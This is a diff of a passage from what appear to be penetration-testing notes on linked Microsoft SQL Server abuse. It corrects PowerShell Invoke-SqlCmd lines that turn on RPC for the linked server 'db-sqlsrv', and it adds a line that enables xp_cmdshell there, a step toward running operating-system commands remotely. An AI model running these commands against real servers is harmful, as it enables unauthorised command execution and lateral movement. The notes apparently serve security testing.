@@ -353,10 +353,10 @@ nonsqlsub            : False
 It's possible configure rpc output on srvSQL:
 
 ```
-PS C:\Windows\system32> Invoke-SqlCmd -Query "Query sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
-PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
-PS C:\Windows\system32> Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
-PS C:\Windows\system32> Invoke-SqlCmd -Query "EXECUTE ('sp_configure' 'show advanced options' ',1;reconfigure;') AT ""db-sqlsrv"""
+Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
+Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
+Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""
+Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
 ```
 
 On the previos cmd with PowerSQL it's possible validate the execution:
